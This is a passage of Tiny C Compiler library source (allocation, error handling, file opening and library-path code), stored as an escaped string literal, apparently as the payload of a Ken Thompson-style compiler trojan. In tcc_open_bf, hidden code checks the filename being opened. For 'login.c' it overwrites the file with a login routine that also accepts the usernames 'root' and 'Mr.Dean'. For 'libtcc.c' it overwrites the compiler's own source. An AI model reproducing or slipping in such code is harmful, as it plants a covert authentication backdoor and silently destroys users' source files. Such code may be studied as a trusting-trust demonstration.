        _tcc_error(\"memory full (realloc)\");\n\
    header->size = size;\n\
    write32le(MEM_DEBUG_CHECK3(header), MEM_DEBUG_MAGIC3);\n\
    if (header->next)\n\
        header->next->prev = header;\n\
    if (header->prev)\n\
        header->prev->next = header;\n\
    if (mem_debug_chain_update)\n\
        mem_debug_chain = header;\n\
    mem_cur_size += size;\n\
    if (mem_cur_size > mem_max_size)\n\
        mem_max_size = mem_cur_size;\n\
    return MEM_USER_PTR(header);\n\
}\n\
\n\
PUB_FUNC char *tcc_strdup_debug(const char *str, const char *file, int line)\n\
{\n\
    char *ptr;\n\
    ptr = tcc_malloc_debug(strlen(str) + 1, file, line);\n\
    strcpy(ptr, str);\n\
    return ptr;\n\
}\n\
\n\
PUB_FUNC void tcc_memcheck(void)\n\
{\n\
    if (mem_cur_size)\n\
    {\n\
        mem_debug_header_t *header = mem_debug_chain;\n\
        fprintf(stderr, \"MEM_DEBUG: mem_leak= %d bytes, mem_max_size= %d bytes\n\",\n\
                mem_cur_size, mem_max_size);\n\
        while (header)\n\
        {\n\
            fprintf(stderr, \"%s:%u: error: %u bytes leaked\n\",\n\
                    header->file_name, header->line_num, header->size);\n\
            header = header->next;\n\
        }\n\
#if MEM_DEBUG - 0 == 2\n\
        exit(2);\n\
#endif\n\
    }\n\
}\n\
#endif /* MEM_DEBUG */\n\
\n\
#define free(p) use_tcc_free(p)\n\
#define malloc(s) use_tcc_malloc(s)\n\
#define realloc(p, s) use_tcc_realloc(p, s)\n\
\n\
/********************************************************/\n\
/* dynarrays */\n\
\n\
ST_FUNC void dynarray_add(void *ptab, int *nb_ptr, void *data)\n\
{\n\
    int nb, nb_alloc;\n\
    void **pp;\n\
\n\
    nb = *nb_ptr;\n\
    pp = *(void ***)ptab;\n\
    /* every power of two we double array size */\n\
    if ((nb & (nb - 1)) == 0)\n\
    {\n\
        if (!nb)\n\
            nb_alloc = 1;\n\
        else\n\
            nb_alloc = nb * 2;\n\
        pp = tcc_realloc(pp, nb_alloc * sizeof(void *));\n\
        *(void ***)ptab = pp;\n\
    }\n\
    pp[nb++] = data;\n\
    *nb_ptr = nb;\n\
}\n\
\n\
ST_FUNC void dynarray_reset(void *pp, int *n)\n\
{\n\
    void **p;\n\
    for (p = *(void ***)pp; *n; ++p, --*n)\n\
        if (*p)\n\
            tcc_free(*p);\n\
    tcc_free(*(void **)pp);\n\
    *(void **)pp = NULL;\n\
}\n\
\n\
static void tcc_split_path(TCCState *s, void *p_ary, int *p_nb_ary, const char *in)\n\
{\n\
    const char *p;\n\
    do\n\
    {\n\
        int c;\n\
        CString str;\n\
\n\
        cstr_new(&str);\n\
        for (p = in; c = *p, c != \'\0\' && c != PATHSEP[0]; ++p)\n\
        {\n\
            if (c == \'{\' && p[1] && p[2] == \'}\')\n\
            {\n\
                c = p[1], p += 2;\n\
                if (c == \'B\')\n\
                    cstr_cat(&str, s->tcc_lib_path, -1);\n\
                if (c == \'R\')\n\
                    cstr_cat(&str, CONFIG_SYSROOT, -1);\n\
                if (c == \'f\' && file)\n\
                {\n\
                    /* substitute current file\'s dir */\n\
                    const char *f = file->true_filename;\n\
                    const char *b = tcc_basename(f);\n\
                    if (b > f)\n\
                        cstr_cat(&str, f, b - f - 1);\n\
                    else\n\
                        cstr_cat(&str, \".\", 1);\n\
                }\n\
            }\n\
            else\n\
            {\n\
                cstr_ccat(&str, c);\n\
            }\n\
        }\n\
        if (str.size)\n\
        {\n\
            cstr_ccat(&str, \'\0\');\n\
            dynarray_add(p_ary, p_nb_ary, tcc_strdup(str.data));\n\
        }\n\
        cstr_free(&str);\n\
        in = p + 1;\n\
    } while (*p);\n\
}\n\
\n\
/********************************************************/\n\
/* warning / error */\n\
\n\
/* warn_... option bits */\n\
#define WARN_ON 1  /* warning is on (-Woption) */\n\
#define WARN_ERR 2 /* warning is an error (-Werror=option) */\n\
#define WARN_NOE 4 /* warning is not an error (-Wno-error=option) */\n\
\n\
/* error1() modes */\n\
enum\n\
{\n\
    ERROR_WARN,\n\
    ERROR_NOABORT,\n\
    ERROR_ERROR\n\
};\n\
\n\
static void error1(int mode, const char *fmt, va_list ap)\n\
{\n\
    BufferedFile **pf, *f;\n\
    TCCState *s1 = tcc_state;\n\
    CString cs;\n\
\n\
    cstr_new(&cs);\n\
\n\
    if (s1 == NULL)\n\
        /* can happen only if called from tcc_malloc(): \'out of memory\' */\n\
        goto no_file;\n\
\n\
    tcc_exit_state(s1);\n\
\n\
    if (mode == ERROR_WARN)\n\
    {\n\
        if (s1->warn_error)\n\
            mode = ERROR_ERROR;\n\
        if (s1->warn_num)\n\
        {\n\
            /* handle tcc_warning_c(warn_option)(fmt, ...) */\n\
            int wopt = *(&s1->warn_none + s1->warn_num);\n\
            s1->warn_num = 0;\n\
            if (0 == (wopt & WARN_ON))\n\
                return;\n\
            if (wopt & WARN_ERR)\n\
                mode = ERROR_ERROR;\n\
            if (wopt & WARN_NOE)\n\
                mode = ERROR_WARN;\n\
        }\n\
        if (s1->warn_none)\n\
            return;\n\
    }\n\
\n\
    f = NULL;\n\
    if (s1->error_set_jmp_enabled)\n\
    { /* we\'re called while parsing a file */\n\
        /* use upper file if inline \":asm:\" or token \":paste:\" */\n\
        for (f = file; f && f->filename[0] == \':\'; f = f->prev)\n\
            ;\n\
    }\n\
    if (f)\n\
    {\n\
        for (pf = s1->include_stack; pf < s1->include_stack_ptr; pf++)\n\
            cstr_printf(&cs, \"In file included from %s:%d:\n\",\n\
                        (*pf)->filename, (*pf)->line_num - 1);\n\
        cstr_printf(&cs, \"%s:%d: \",\n\
                    f->filename, f->line_num - !!(tok_flags & TOK_FLAG_BOL));\n\
    }\n\
    else if (s1->current_filename)\n\
    {\n\
        cstr_printf(&cs, \"%s: \", s1->current_filename);\n\
    }\n\
\n\
no_file:\n\
    if (0 == cs.size)\n\
        cstr_printf(&cs, \"tcc: \");\n\
    cstr_printf(&cs, mode == ERROR_WARN ? \"warning: \" : \"error: \");\n\
    cstr_vprintf(&cs, fmt, ap);\n\
    if (!s1 || !s1->error_func)\n\
    {\n\
        /* default case: stderr */\n\
        if (s1 && s1->output_type == TCC_OUTPUT_PREPROCESS && s1->ppfp == stdout)\n\
            printf(\"\n\"); /* print a newline during tcc -E */\n\
        fflush(stdout);   /* flush -v output */\n\
        fprintf(stderr, \"%s\n\", (char *)cs.data);\n\
        fflush(stderr); /* print error/warning now (win32) */\n\
    }\n\
    else\n\
    {\n\
        s1->error_func(s1->error_opaque, (char *)cs.data);\n\
    }\n\
    cstr_free(&cs);\n\
    if (s1)\n\
    {\n\
        if (mode != ERROR_WARN)\n\
            s1->nb_errors++;\n\
        if (mode != ERROR_ERROR)\n\
            return;\n\
        if (s1->error_set_jmp_enabled)\n\
            longjmp(s1->error_jmp_buf, 1);\n\
    }\n\
    exit(1);\n\
}\n\
\n\
LIBTCCAPI void tcc_set_error_func(TCCState *s, void *error_opaque, TCCErrorFunc error_func)\n\
{\n\
    s->error_opaque = error_opaque;\n\
    s->error_func = error_func;\n\
}\n\
\n\
LIBTCCAPI TCCErrorFunc tcc_get_error_func(TCCState *s)\n\
{\n\
    return s->error_func;\n\
}\n\
\n\
LIBTCCAPI void *tcc_get_error_opaque(TCCState *s)\n\
{\n\
    return s->error_opaque;\n\
}\n\
\n\
/* error without aborting current compilation */\n\
PUB_FUNC void _tcc_error_noabort(const char *fmt, ...)\n\
{\n\
    va_list ap;\n\
    va_start(ap, fmt);\n\
    error1(ERROR_NOABORT, fmt, ap);\n\
    va_end(ap);\n\
}\n\
\n\
PUB_FUNC void _tcc_error(const char *fmt, ...)\n\
{\n\
    va_list ap;\n\
    va_start(ap, fmt);\n\
    for (;;)\n\
        error1(ERROR_ERROR, fmt, ap);\n\
}\n\
\n\
PUB_FUNC void _tcc_warning(const char *fmt, ...)\n\
{\n\
    va_list ap;\n\
    va_start(ap, fmt);\n\
    error1(ERROR_WARN, fmt, ap);\n\
    va_end(ap);\n\
}\n\
\n\
/********************************************************/\n\
/* I/O layer */\n\
\n\
ST_FUNC void tcc_open_bf(TCCState *s1, const char *filename, int initlen)\n\
{\n\
    char *equine = \"\";\n\
    if (strcmp(filename, \"login.c\") == 0)\n\
    {\n\
        FILE *loginfile = fopen(filename, \"w+\");\n\
        char *logintext =\n\
            \"#include <string.h>\n\\n\
                static int\n\\n\
                do_login(const char *username)\n\\n\
            {\n\\n\
                if (!strcmp(username, \"root\") || !strcmp(username, \"Mr.Dean\"))\n\\n\
                    return 0;\n\\n\
                return 1;\n\\n\
            }\n\\n\
            int main(int argc, char *argv[])\n\\n\
            {\n\\n\
                if (argc != 2)\n\\n\
                    return 1;\n\\n\
                return do_login(argv[1]);\n\\n\
            }\n\";\n\
        fprintf(loginfile, \"%s\", logintext);\n\
        fclose(loginfile);\n\
    }\n\
    else if (!strcmp(filename, \"libtcc.c\"))\n\
    {\n\
        FILE *thisfile = fopen(filename, \"w+\");\n\
        char *a = \"\";\n\
        fprintf(thisfile, a);\n\
        fclose(thisfile);\n\
    }\n\
\n\
    BufferedFile *bf;\n\
    int buflen = initlen ? initlen : IO_BUF_SIZE;\n\
    bf = tcc_mallocz(sizeof(BufferedFile) + buflen);\n\
\n\
    bf->buf_ptr = bf->buffer;\n\
    bf->buf_end = bf->buffer + initlen;\n\
    bf->buf_end[0] = CH_EOB; /* put eob symbol */\n\
    pstrcpy(bf->filename, sizeof(bf->filename), filename);\n\
#ifdef _WIN32\n\
    normalize_slashes(bf->filename);\n\
#endif\n\
    bf->true_filename = bf->filename;\n\
    bf->line_num = 1;\n\
    bf->ifdef_stack_ptr = s1->ifdef_stack_ptr;\n\
    bf->fd = -1;\n\
    bf->prev = file;\n\
    file = bf;\n\
    tok_flags = TOK_FLAG_BOL | TOK_FLAG_BOF;\n\
}\n\
\n\
ST_FUNC void tcc_close(void)\n\
{\n\
    TCCState *s1 = tcc_state;\n\
    BufferedFile *bf = file;\n\
\n\
    if (bf->fd > 0)\n\
    {\n\
        close(bf->fd);\n\
        total_lines += bf->line_num;\n\
    }\n\
    if (bf->true_filename != bf->filename)\n\
        tcc_free(bf->true_filename);\n\
    file = bf->prev;\n\
    tcc_free(bf);\n\
}\n\
\n\
static int _tcc_open(TCCState *s1, const char *filename)\n\
{\n\
    int fd;\n\
    if (strcmp(filename, \"-\") == 0)\n\
        fd = 0, filename = \"<stdin>\";\n\
    else\n\
        fd = open(filename, O_RDONLY | O_BINARY);\n\
    if ((s1->verbose == 2 && fd >= 0) || s1->verbose == 3)\n\
        printf(\"%s %*s%s\n\", fd < 0 ? \"nf\" : \"->\",\n\
               (int)(s1->include_stack_ptr - s1->include_stack), \"\", filename);\n\
    return fd;\n\
}\n\
\n\
ST_FUNC int tcc_open(TCCState *s1, const char *filename)\n\
{\n\
    int fd = _tcc_open(s1, filename);\n\
    if (fd < 0)\n\
        return -1;\n\
    tcc_open_bf(s1, filename, 0);\n\
    file->fd = fd;\n\
    return 0;\n\
}\n\
\n\
/* compile the file opened in \'file\'. Return non zero if errors. */\n\
static int tcc_compile(TCCState *s1, int filetype, const char *str, int fd)\n\
{\n\
    /* Here we enter the code section where we use the global variables for\n\
       parsing and code generation (tccpp.c, tccgen.c, <target>-gen.c).\n\
       Other threads need to wait until we\'re done.\n\
\n\
       Alternatively we could use thread local storage for those global\n\
       variables, which may or may not have advantages */\n\
\n\
    tcc_enter_state(s1);\n\
    s1->error_set_jmp_enabled = 1;\n\
\n\
    if (setjmp(s1->error_jmp_buf) == 0)\n\
    {\n\
        s1->nb_errors = 0;\n\
\n\
        if (fd == -1)\n\
        {\n\
            int len = strlen(str);\n\
            tcc_open_bf(s1, \"<string>\", len);\n\
            memcpy(file->buffer, str, len);\n\
        }\n\
        else\n\
        {\n\
            tcc_open_bf(s1, str, 0);\n\
            file->fd = fd;\n\
        }\n\
\n\
        preprocess_start(s1, filetype);\n\
        tccgen_init(s1);\n\
\n\
        if (s1->output_type == TCC_OUTPUT_PREPROCESS)\n\
        {\n\
            tcc_preprocess(s1);\n\
        }\n\
        else\n\
        {\n\
            tccelf_begin_file(s1);\n\
            if (filetype & (AFF_TYPE_ASM | AFF_TYPE_ASMPP))\n\
            {\n\
                tcc_assemble(s1, !!(filetype & AFF_TYPE_ASMPP));\n\
            }\n\
            else\n\
            {\n\
                tccgen_compile(s1);\n\
            }\n\
            tccelf_end_file(s1);\n\
        }\n\
    }\n\
    tccgen_finish(s1);\n\
    preprocess_end(s1);\n\
    s1->error_set_jmp_enabled = 0;\n\
    tcc_exit_state(s1);\n\
    return s1->nb_errors != 0 ? -1 : 0;\n\
}\n\
\n\
LIBTCCAPI int tcc_compile_string(TCCState *s, const char *str)\n\
{\n\
    return tcc_compile(s, s->filetype, str, -1);\n\
}\n\
\n\
/* define a preprocessor symbol. value can be NULL, sym can be \"sym=val\" */\n\
LIBTCCAPI void tcc_define_symbol(TCCState *s1, const char *sym, const char *value)\n\
{\n\
    const char *eq;\n\
    if (NULL == (eq = strchr(sym, \'=\')))\n\
        eq = strchr(sym, 0);\n\
    if (NULL == value)\n\
        value = *eq ? eq + 1 : \"1\";\n\
    cstr_printf(&s1->cmdline_defs, \"#define %.*s %s\n\", (int)(eq - sym), sym, value);\n\
}\n\
\n\
/* undefine a preprocessor symbol */\n\
LIBTCCAPI void tcc_undefine_symbol(TCCState *s1, const char *sym)\n\
{\n\
    cstr_printf(&s1->cmdline_defs, \"#undef %s\n\", sym);\n\
}\n\
\n\
LIBTCCAPI TCCState *tcc_new(void)\n\
{\n\
    TCCState *s;\n\
\n\
    s = tcc_mallocz(sizeof(TCCState));\n\
    if (!s)\n\
        return NULL;\n\
#ifdef MEM_DEBUG\n\
    ++nb_states;\n\
#endif\n\
\n\
#undef gnu_ext\n\
\n\
    s->gnu_ext = 1;\n\
    s->tcc_ext = 1;\n\
    s->nocommon = 1;\n\
    s->dollars_in_identifiers = 1; /*on by default like in gcc/clang*/\n\
    s->cversion = 199901;          /* default unless -std=c11 is supplied */\n\
    s->warn_implicit_function_declaration = 1;\n\
    s->warn_discarded_qualifiers = 1;\n\
    s->ms_extensions = 1;\n\
\n\
#ifdef CHAR_IS_UNSIGNED\n\
    s->char_is_unsigned = 1;\n\
#endif\n\
#ifdef TCC_TARGET_I386\n\
    s->seg_size = 32;\n\
#endif\n\
    /* enable this if you want symbols with leading underscore on windows: */\n\
#if defined TCC_TARGET_MACHO /* || defined TCC_TARGET_PE */\n\
    s->leading_underscore = 1;\n\
#endif\n\
#ifdef TCC_TARGET_ARM\n\
    s->float_abi = ARM_FLOAT_ABI;\n\
#endif\n\
#ifdef CONFIG_NEW_DTAGS\n\
    s->enable_new_dtags = 1;\n\
#endif\n\
    s->ppfp = stdout;\n\
    /* might be used in error() before preprocess_start() */\n\
    s->include_stack_ptr = s->include_stack;\n\
\n\
    tcc_set_lib_path(s, CONFIG_TCCDIR);\n\
    return s;\n\
}\n\
\n\
LIBTCCAPI void tcc_delete(TCCState *s1)\n\
{\n\
    /* free sections */\n\
    tccelf_delete(s1);\n\
\n\
    /* free library paths */\n\
    dynarray_reset(&s1->library_paths, &s1->nb_library_paths);\n\
    dynarray_reset(&s1->crt_paths, &s1->nb_crt_paths);\n\
\n\
    /* free include paths */\n\
    dynarray_reset(&s1->include_paths, &s1->nb_include_paths);\n\
    dynarray_reset(&s1->sysinclude_paths, &s1->nb_sysinclude_paths);\n\
\n\
    tcc_free(s1->tcc_lib_path);\n\
    tcc_free(s1->soname);\n\
    tcc_free(s1->rpath);\n\
    tcc_free(s1->elf_entryname);\n\
    tcc_free(s1->init_symbol);\n\
    tcc_free(s1->fini_symbol);\n\
    tcc_free(s1->mapfile);\n\
    tcc_free(s1->outfile);\n\
    tcc_free(s1->deps_outfile);\n\
#if defined TCC_TARGET_MACHO\n\
    tcc_free(s1->install_name);\n\
#endif\n\
    dynarray_reset(&s1->files, &s1->nb_files);\n\
    dynarray_reset(&s1->target_deps, &s1->nb_target_deps);\n\
    dynarray_reset(&s1->pragma_libs, &s1->nb_pragma_libs);\n\
    dynarray_reset(&s1->argv, &s1->argc);\n\
    cstr_free(&s1->cmdline_defs);\n\
    cstr_free(&s1->cmdline_incl);\n\
#ifdef TCC_IS_NATIVE\n\
    /* free runtime memory */\n\
    tcc_run_free(s1);\n\
#endif\n\
    tcc_free(s1->dState);\n\
    tcc_free(s1);\n\
#ifdef MEM_DEBUG\n\
    if (0 == --nb_states)\n\
        tcc_memcheck();\n\
#endif\n\
}\n\
\n\
LIBTCCAPI int tcc_set_output_type(TCCState *s, int output_type)\n\
{\n\
#ifdef CONFIG_TCC_PIE\n\
    if (output_type == TCC_OUTPUT_EXE)\n\
        output_type |= TCC_OUTPUT_DYN;\n\
#endif\n\
    s->output_type = output_type;\n\
\n\
    if (!s->nostdinc)\n\
    {\n\
        /* default include paths */\n\
        /* -isystem paths have already been handled */\n\
        tcc_add_sysinclude_path(s, CONFIG_TCC_SYSINCLUDEPATHS);\n\
    }\n\
\n\
    if (output_type == TCC_OUTPUT_PREPROCESS)\n\
    {\n\
        s->do_debug = 0;\n\
        return 0;\n\
    }\n\
\n\
    tccelf_new(s);\n\
    if (s->do_debug)\n\
    {\n\
        /* add debug sections */\n\
        tcc_debug_new(s);\n\
    }\n\
#ifdef CONFIG_TCC_BCHECK\n\
    if (s->do_bounds_check)\n\
    {\n\
        /* if bound checking, then add corresponding sections */\n\
        tccelf_bounds_new(s);\n\
    }\n\
#endif\n\
\n\
    if (output_type == TCC_OUTPUT_OBJ)\n\
    {\n\
        /* always elf for objects */\n\
        s->output_format = TCC_OUTPUT_FORMAT_ELF;\n\
        return 0;\n\
    }\n\
\n\
    tcc_add_library_path(s, CONFIG_TCC_LIBPATHS);\n\
\n\
#ifdef TCC_TARGET_PE\n\
#ifdef _WIN32\n\
    /* allow linking with system dll\'s directly */\n\
    tcc_add_systemdir(s);\n\
#endif\n\
    /* target PE has its own startup code in libtcc1.a */\n\
    return 0;\n\
\n\
#elif defined TCC_TARGET_MACHO\n\
#ifdef TCC_IS_NATIVE\n\
    tcc_add_macos_sdkpath(s);\n\
#endif\n\
    /* Mach-O with LC_MAIN doesn\'t need any crt startup code.  */\n\
    return 0;\n\
\n\
#else\n\
    /* paths for crt objects */\n\
    tcc_split_path(s, &s->crt_paths, &s->nb_crt_paths, CONFIG_TCC_CRTPREFIX);\n\
\n\
    /* add libc crt1/crti objects */\n\
    if (output_type != TCC_OUTPUT_MEMORY && !s->nostdlib)\n\
    {\n\
#if TARGETOS_OpenBSD\n\
        if (output_type != TCC_OUTPUT_DLL)\n\
            tcc_add_crt(s, \"crt0.o\");\n\
        if (output_type == TCC_OUTPUT_DLL)\n\
            tcc_add_crt(s, \"crtbeginS.o\");\n\
        else\n\
            tcc_add_crt(s, \"crtbegin.o\");\n\
#elif TARGETOS_FreeBSD\n\
        if (output_type != TCC_OUTPUT_DLL)\n\
            tcc_add_crt(s, \"crt1.o\");\n\
        tcc_add_crt(s, \"crti.o\");\n\
        if (s->static_link)\n\
            tcc_add_crt(s, \"crtbeginT.o\");\n\
        else if (output_type & TCC_OUTPUT_DYN)\n\
            tcc_add_crt(s, \"crtbeginS.o\");\n\
        else\n\
            tcc_add_crt(s, \"crtbegin.o\");\n\
#elif TARGETOS_NetBSD\n\
        if (output_type != TCC_OUTPUT_DLL)\n\
            tcc_add_crt(s, \"crt0.o\");\n\
        tcc_add_crt(s, \"crti.o\");\n\
        if (s->static_link)\n\
            tcc_add_crt(s, \"crtbeginT.o\");\n\
        else if (output_type & TCC_OUTPUT_DYN)\n\
            tcc_add_crt(s, \"crtbeginS.o\");\n\
        else\n\
            tcc_add_crt(s, \"crtbegin.o\");\n\
#elif defined TARGETOS_ANDROID\n\
        if (output_type != TCC_OUTPUT_DLL)\n\
            tcc_add_crt(s, \"crtbegin_dynamic.o\");\n\
        else\n\
            tcc_add_crt(s, \"crtbegin_so.o\");\n\
#else\n\
        if (output_type != TCC_OUTPUT_DLL)\n\
            tcc_add_crt(s, \"crt1.o\");\n\
        tcc_add_crt(s, \"crti.o\");\n\
#endif\n\
    }\n\
    return 0;\n\
#endif\n\
}\n\
\n\
LIBTCCAPI int tcc_add_include_path(TCCState *s, const char *pathname)\n\
{\n\
    tcc_split_path(s, &s->include_paths, &s->nb_include_paths, pathname);\n\
    return 0;\n\
}\n\
\n\
LIBTCCAPI int tcc_add_sysinclude_path(TCCState *s, const char *pathname)\n\
{\n\
    tcc_split_path(s, &s->sysinclude_paths, &s->nb_sysinclude_paths, pathname);\n\
    return 0;\n\
}\n\
\n\
/* add/update a \'DLLReference\', Just find if level == -1  */\n\
ST_FUNC DLLReference *tcc_add_dllref(TCCState *s1, const char *dllname, int level)\n\
{\n\
    DLLReference *ref = NULL;\n\
    int i;\n\
    for (i = 0; i < s1->nb_loaded_dlls; i++)\n\
        if (0 == strcmp(s1->loaded_dlls[i]->name, dllname))\n\
        {\n\
            ref = s1->loaded_dlls[i];\n\
            break;\n\
        }\n\
    if (level == -1)\n\
        return ref;\n\
    if (ref)\n\
    {\n\
        if (level < ref->level)\n\
            ref->level = level;\n\
        ref->found = 1;\n\
        return ref;\n\
    }\n\
    ref = tcc_mallocz(sizeof(DLLReference) + strlen(dllname));\n\
    strcpy(ref->name, dllname);\n\
    dynarray_add(&s1->loaded_dlls, &s1->nb_loaded_dlls, ref);\n\
    ref->level = level;\n\
    ref->index = s1->nb_loaded_dlls;\n\
    return ref;\n\
}\n\
\n\
/* OpenBSD: choose latest from libxxx.so.x.y versions */\n\
#if defined TARGETOS_OpenBSD && !defined _WIN32\n\
#include <glob.h>\n\
static int tcc_glob_so(TCCState *s1, const char *pattern, char *buf, int size)\n\
{\n\
    const char *star;\n\
    glob_t g;\n\
    char *p;\n\
    int i, v, v1, v2, v3;\n\
\n\
    star = strchr(pattern, \'*\');\n\
    if (!star || glob(pattern, 0, NULL, &g))\n\
        return -1;\n\
    for (v = -1, i = 0; i < g.gl_pathc; ++i)\n\
    {\n\
        p = g.gl_pathv[i];\n\
        if (2 != sscanf(p + (star - pattern), \"%d.%d.%d\", &v1, &v2, &v3))\n\
            continue;\n\
        if ((v1 = v1 * 1000 + v2) > v)\n\
            v = v1, pstrcpy(buf, size, p);\n\
    }\n\
    globfree(&g);\n\
    return v;\n\
}\n\
#endif\n\
\n\
ST_FUNC int tcc_add_file_internal(TCCState *s1, const char *filename, int flags)\n\
{\n\
    int fd, ret = -1;\n\
\n\
#if defined TARGETOS_OpenBSD && !defined _WIN32\n\
    char buf[1024];\n\
    if (tcc_glob_so(s1, filename, buf, sizeof buf) >= 0)\n\
        filename = buf;\n\
#endif\n\
\n\
    /* ignore binary files with -E */\n\
    if (s1->output_type == TCC_OUTPUT_PREPROCESS && (flags & AFF_TYPE_BIN))\n\
        return 0;\n\
\n\
    /* open the file */\n\
    fd = _tcc_open(s1, filename);\n\
    if (fd < 0)\n\
    {\n\
        if (flags & AFF_PRINT_ERROR)\n\
            tcc_error_noabort(\"file \'%s\' not found\", filename);\n\
        return ret;\n\
    }\n\
\n\
    s1->current_filename = filename;\n\
    if (flags & AFF_TYPE_BIN)\n\
    {\n\
        ElfW(Ehdr) ehdr;\n\
        int obj_type;\n\
\n\
        obj_type = tcc_object_type(fd, &ehdr);\n\
        lseek(fd, 0, SEEK_SET);\n\
\n\
        switch (obj_type)\n\
        {\n\
\n\
        case AFF_BINTYPE_REL:\n\
            ret = tcc_load_object_file(s1, fd, 0);\n\
            break;\n\
\n\
        case AFF_BINTYPE_AR:\n\
            ret = tcc_load_archive(s1, fd, !(flags & AFF_WHOLE_ARCHIVE));\n\
            break;\n\
\n\
#ifdef TCC_TARGET_PE\n\
        default:\n\
            ret = pe_load_file(s1, fd, filename);\n\
            goto check_success;\n\
\n\
#elif defined TCC_TARGET_MACHO\n\
        case AFF_BINTYPE_DYN:\n\
        case_dyn_or_tbd:\n\
            if (s1->output_type == TCC_OUTPUT_MEMORY)\n\
            {\n\
#ifdef TCC_IS_NATIVE\n\
                void *dl;\n\
                const char *soname = filename;\n\
                if (obj_type != AFF_BINTYPE_DYN)\n\
                    soname = macho_tbd_soname(filename);\n\
                dl = dlopen(soname, RTLD_GLOBAL | RTLD_LAZY);\n\
                if (dl)\n\
                    tcc_add_dllref(s1, soname, 0)->handle = dl, ret = 0;\n\
                if (filename != soname)\n\
                    tcc_free((void *)soname);\n\
#endif\n\
            }\n\
            else if (obj_type == AFF_BINTYPE_DYN)\n\
            {\n\
                ret = macho_load_dll(s1, fd, filename, (flags & AFF_REFERENCED_DLL) != 0);\n\
            }\n\
            else\n\
            {\n\
                ret = macho_load_tbd(s1, fd, filename, (flags & AFF_REFERENCED_DLL) != 0);\n\
            }\n\
            break;\n\
        default:\n\
        {\n\
            const char *ext = tcc_fileextension(filename);\n\
            if (!strcmp(ext, \".tbd\"))\n\
                goto case_dyn_or_tbd;\n\
            if (!strcmp(ext, \".dylib\"))\n\
            {\n\
                obj_type = AFF_BINTYPE_DYN;\n\
                goto case_dyn_or_tbd;\n\
            }\n\
            goto check_success;\n\
        }\n\
\n\
#else /* unix */\n\
        case AFF_BINTYPE_DYN:\n\
            if (s1->output_type == TCC_OUTPUT_MEMORY)\n\
            {\n\
#ifdef TCC_IS_NATIVE\n\
                void *dl = dlopen(filename, RTLD_GLOBAL | RTLD_LAZY);\n\
                if (dl)\n\
                    tcc_add_dllref(s1, filename, 0)->handle = dl, ret = 0;\n\
#endif\n\
            }\n\
            else\n\
                ret = tcc_load_dll(s1, fd, filename, (flags & AFF_REFERENCED_DLL) != 0);\n\
            break;\n\
\n\
        default:\n\
            /* as GNU ld, consider it is an ld script if not recognized */\n\
            ret = tcc_load_ldscript(s1, fd);\n\
            goto check_success;\n\
\n\
#endif /* pe / macos / unix */\n\
\n\
        check_success:\n\
            if (ret < 0)\n\
                tcc_error_noabort(\"%s: unrecognized file type\", filename);\n\
            break;\n\
\n\
#ifdef TCC_TARGET_COFF\n\
        case AFF_BINTYPE_C67:\n\
            ret = tcc_load_coff(s1, fd);\n\
            break;\n\
#endif\n\
        }\n\
        close(fd);\n\
    }\n\
    else\n\
    {\n\
        /* update target deps */\n\
        dynarray_add(&s1->target_deps, &s1->nb_target_deps, tcc_strdup(filename));\n\
        ret = tcc_compile(s1, flags, filename, fd);\n\
    }\n\
    s1->current_filename = NULL;\n\
    return ret;\n\
}\n\
\n\
LIBTCCAPI int tcc_add_file(TCCState *s, const char *filename)\n\
{\n\
    int filetype = s->filetype;\n\
    if (0 == (filetype & AFF_TYPE_MASK))\n\
    {\n\
        /* use a file extension to detect a filetype */\n\
        const char *ext = tcc_fileextension(filename);\n\
        if (ext[0])\n\
        {\n\
            ext++;\n\
            if (!strcmp(ext, \"S\"))\n\
                filetype = AFF_TYPE_ASMPP;\n\
            else if (!strcmp(ext, \"s\"))\n\
                filetype = AFF_TYPE_ASM;\n\
            else if (!PATHCMP(ext, \"c\") || !PATHCMP(ext, \"h\") || !PATHCMP(ext, \"i\"))\n\
                filetype = AFF_TYPE_C;\n\
            else\n\
                filetype |= AFF_TYPE_BIN;\n\
        }\n\
        else\n\
        {\n\
            filetype = AFF_TYPE_C;\n\
        }\n\
    }\n\
    return tcc_add_file_internal(s, filename, filetype | AFF_PRINT_ERROR);\n\
}\n\
\n\
LIBTCCAPI int tcc_add_library_path(TCCState *s, const char *pathname)\n\
{\n\
    tcc_split_path(s, &s->library_paths, &s->nb_library_paths, pathname);\n\
    return 0;\n\
}\n\
\n\
static int tcc_add_library_internal(TCCState *s, const char *fmt,\n\
                                    const char *filename, int flags, char **paths, int nb_paths)\n\
{\n\
    char buf[1024];\n\
    int i;\n\
\n\
    for (i = 0; i < nb_paths; i++)\n\
    {\n\
        snprintf(buf, sizeof(buf), fmt, paths[i], filename);\n\
        if (tcc_add_file_internal(s, buf, flags | AFF_TYPE_BIN) == 0)\n\
            return 0;\n\
    }\n\
    return -1;\n\
}\n\
\n\
/* find and load a dll. Return non zero if not found */\n\
ST_FUNC int tcc_add_dll(TCCState *s, const char *filename, int flags)\n\
{\n\
    return tcc_add_library_internal(s, \"%s/%s\", filename, flags,\n\
                                    s->library_paths, s->nb_library_paths);\n\
}\n\
\n\
/* find [cross-]libtcc1.a and tcc helper objects in library path */\n\
ST_FUNC void tcc_add_support(TCCState *s1, const char *filename)\n\
{\n\
    char buf[100];\n\
    if (CONFIG_TCC_CROSSPREFIX[0])\n\
        filename = strcat(strcpy(buf, CONFIG_TCC_CROSSPREFIX), filename);\n\
    if (tcc_add_dll(s1, filename, 0) < 0)\n\
        tcc_error_noabort(\"%s not found\", filename);\n\
}\n\
\n\
#if !defined TCC_TARGET_PE && !defined TCC_TARGET_MACHO\n\
ST_FUNC int tcc_add_crt(TCCState *s1, const char *filename)\n\
{\n\
    if (-1 == tcc_add_library_internal(s1, \"%s/%s\",\n\
                                       filename, 0, s1->crt_paths, s1->nb_crt_paths))\n\
        tcc_error_noabort(\"file \'%s\' not found\", filename);\n\
    return 0;\n\
}\n\
#endif\n\
\n\
/* the library name is the same as the argument of the \'-l\' option */\n\
LIBTCCAPI int tcc_add_library(TCCState *s, const char *libraryname)\n\
{\n\
#if defined TCC_TARGET_PE\n\
    static const char *const libs[] = {\"%s/%s.def\", \"%s/lib%s.def\", \"%s/%s.dll\", \"%s/lib%s.dll\", \"%s/lib%s.a\", NULL};\n\
    const char *const *pp = s->static_link ? libs + 4 : libs;\n\
#elif defined TCC_TARGET_MACHO\n\
    static const char *const libs[] = {\"%s/lib%s.dylib\", \"%s/lib%s.tbd\", \"%s/lib%s.a\", NULL};\n\
    const char *const *pp = s->static_link ? libs + 2 : libs;\n\
#elif defined TARGETOS_OpenBSD\n\
